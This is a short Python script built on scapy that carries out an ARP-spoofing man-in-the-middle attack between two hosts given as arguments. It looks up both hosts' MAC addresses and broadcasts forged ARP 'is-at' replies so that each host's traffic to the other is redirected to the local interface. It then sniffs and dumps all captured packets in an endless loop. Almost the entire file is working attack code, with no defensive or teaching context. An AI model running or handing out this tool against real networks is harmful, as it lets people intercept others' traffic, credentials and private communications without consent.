#!/usr/bin/env python3

import argparse

from scapy.all import get_if_hwaddr, getmacbyip, sendp, sniff
from scapy.layers.l2 import Ether, ARP
from scapy.packet import Packet

RESET = "\033[0m"

BLACK    = "\033[30m"
RED      = "\033[31m"
GREEN    = "\033[32m"
YELLOW   = "\033[33m"
BLUE     = "\033[34m"
MAGNETTA = "\033[35m"
CYAN     = "\033[36m"
WHITE    = "\033[37m"
DEFAULT  = "\033[39m"

BLACK_BG    = "\033[40m"
RED_BG      = "\033[41m"
GREEN_BG    = "\033[42m"
YELLOW_BG   = "\033[43m"
BLUE_BG     = "\033[44m"
MAGNETTA_BG = "\033[45m"
CYAN_BG     = "\033[46m"
WHITE_BG    = "\033[47m"
DEFAULT_BG  = "\033[49m"

def process(p:Packet):
    try:
        print(f"\n{p.show()}\n")

    except Exception as ex:
        print(f"{RED}{ex}{RESET}")

parser = argparse.ArgumentParser()

parser.add_argument("--ip1", required=True, help="IP of first user")
parser.add_argument("--ip2", required=True, help="IP of second user")
parser.add_argument("--interface", default="eth0", help="Network interface")

args = parser.parse_args()

ip1 = args.ip1
ip2 = args.ip2
interface = args.interface

print(f"{GREEN}IP 1:\t\t{ip1}{RESET}")
print(f"{GREEN}IP 2:\t\t{ip2}{RESET}")
print(f"{GREEN}Interface:\t{interface}{RESET}")

try:
    mac1 = getmacbyip(ip=ip1)
    if mac1 is None:
        raise Exception(f"Failed to get MAC 1: {mac1}")

    print(f"{GREEN}MAC 1: {mac1}{RESET}")

    mac2 = getmacbyip(ip=ip2)
    if mac2 is None:
        raise Exception(f"Failed to get MAC 2: {mac2}")

    print(f"{GREEN}MAC 2: {mac2}{RESET}")

    local_mac = get_if_hwaddr(interface)
    print(f"{GREEN}Interface MAC: {local_mac}{RESET}")

    eth = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")
    arp1 = ARP(op="is-at", hwdst=local_mac, psrc = ip1, pdst = ip2)
    arp2 = ARP(op="is-at", hwdst=local_mac, psrc = ip2, pdst = ip1)

    print(f"\n{GREEN}Sending ARP 'is-at' to {ip1}{RESET}")
    sendp(eth/arp1, iface=interface, verbose=True)

    print(f"\n{GREEN}Sending ARP 'is-at' to {ip2}{RESET}")
    sendp(eth/arp2, iface=interface, verbose=True)

    while True:
        sniff(iface=interface, prn=process)

except Exception as ex:
    print(f"{RED}{ex}{RESET}")

